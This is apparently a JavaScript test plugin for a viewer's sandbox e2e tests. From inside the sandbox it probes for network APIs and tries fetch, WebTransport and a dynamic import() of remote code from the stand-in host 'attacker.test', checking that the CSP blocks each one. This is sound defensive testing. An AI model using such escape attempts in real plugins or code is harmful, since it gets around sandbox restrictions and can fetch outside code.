// Plugin of the viewer e2e tests (stage #2059, VF2, decision 13): `generate` and `parse` look, inside the
// viewer's sandbox, for a way to the network and say what they found. The prefix of the Worker removes
// `fetch` and the other APIs it knows, but not `WebTransport` or a dynamic `import()`: those are shut by the
// sandbox document's own CSP (`connect-src 'none'`, `script-src` with no network source), even in a host page
// whose CSP allows the network. The attempts below aim at `https://attacker.test/`, which the test watches.
//
// `parse` answers with one container whose name is the report (JSON), so `screenFromFormat` hands it to the
// test as `screen.name`; `generate` returns the same report as the file's text.
var TARGET = 'https://attacker.test/';

function attempt() {
  var report = { found: [], fetch: 'none', webTransport: 'none', dynamicImport: 'none' };
  [
    'fetch',
    'XMLHttpRequest',
    'WebSocket',
    'EventSource',
    'importScripts',
    'WebTransport',
  ].forEach(function (name) {
    if (typeof globalThis[name] !== 'undefined') report.found.push(name);
  });
  try {
    globalThis.fetch(TARGET + 'fetch');
    report.fetch = 'called';
  } catch {
    report.fetch = 'threw';
  }
  try {
    var transport = new globalThis.WebTransport(TARGET + 'transport');
    report.webTransport = 'constructed';
    transport.ready.then(
      function () {},
      function () {},
    );
    transport.closed.then(
      function () {},
      function () {},
    );
  } catch {
    report.webTransport = 'threw';
  }
  try {
    var loading = import(TARGET + 'module.js');
    report.dynamicImport = 'pending';
    loading.then(
      function () {},
      function () {},
    );
  } catch {
    report.dynamicImport = 'threw';
  }
  return JSON.stringify(report);
}

function generate() {
  return attempt();
}

function parse() {
  return {
    operations: [
      {
        op: 'add_container',
        as: '$screen',
        name: attempt(),
        width: 200,
        height: 100,
        background: '#FFFFFF',
      },
      {
        op: 'create_marking',
        as: '$button',
        container: '$screen',
        rect: { x: 10, y: 10, width: 100, height: 40 },
        annotation: { type: 'sdui-backend/sdui-button', values: {} },
      },
    ],
    warnings: [],
  };
}
